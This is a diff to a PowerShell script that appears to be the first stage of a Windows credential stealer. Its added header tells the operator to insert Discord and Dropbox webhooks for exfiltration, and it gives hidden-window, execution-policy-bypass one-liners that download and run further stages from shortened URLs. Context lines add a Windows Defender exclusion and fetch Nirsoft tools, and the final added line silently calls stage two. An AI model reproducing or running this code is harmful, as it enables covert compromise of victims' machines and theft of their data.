@@ -1,3 +1,40 @@
+<# 
+
+______________________________________________________________________________________________
+
+888      d888                             888          d8888                            d8888  
+888     d8888                             888         d8P888                           d8P888  
+888       888                             888        d8P 888                          d8P 888  
+88888b.   888   .d88b.           88888b.  88888b.   d8P  888  888d888 88888b.d88b.   d8P  888  
+888 "88b  888  d88P"88b          888 "88b 888 "88b d88   888  888P"   888 "888 "88b d88   888  
+888  888  888  888  888          888  888 888  888 8888888888 888     888  888  888 8888888888 
+888 d88P  888  Y88b 888          888 d88P 888  888       888  888     888  888  888       888  
+88888P" 8888888 "Y88888 88888888 88888P"  888  888       888  888     888  888  888       888  
+                    888          888                                                           
+               Y8b d88P          888                                                           
+                "Y88P"           888                                                           
+______________________________________________________________________________________________
+
+
+Execute command having a max caracters to put into, I need to shorten the links for the command to be as short as possible.
+W1ns1d3r_st4gg2d --> stage1 url : https://shorturl.at/evBKX
+W1ns1d3r_st4gg2d --> stage2 url : https://shorturl.at/rLQS5
+
+Need to modify the invoke command to fit your needs : 
+	-Put your discord webhook into $dc=''
+ 	-Put your dropbox webhook into $db=''
+
+Invoke stage1.ps1 via windows : 
+powershell -NoP -Ep Bypass $dc='';$db='';irm https://shorturl.at/evBKX | iex
+
+Invoke stage2.ps1 via windows : 
+powershell -w h -NoP -Ep Bypass $dc=$dc;$db=$db;irm https://shorturl.at/rLQS5 | iex
+
+
+#>
+
+
+
 # Function to handle the temporary directory
 function TempDir {
     # Check if the C:\temp directory exists
@@ -56,3 +93,6 @@ Add-MpPreference -ExclusionPath "C:\temp"
 
 # Call Get-Nirsoft function to download Nirsoft tools
 Get-Nirsoft
+
+#Calling the stage2
+powershell -w h -NoP -Ep Bypass $dc=$dc;$db=$db;irm https://shorturl.at/rLQS5 | iex
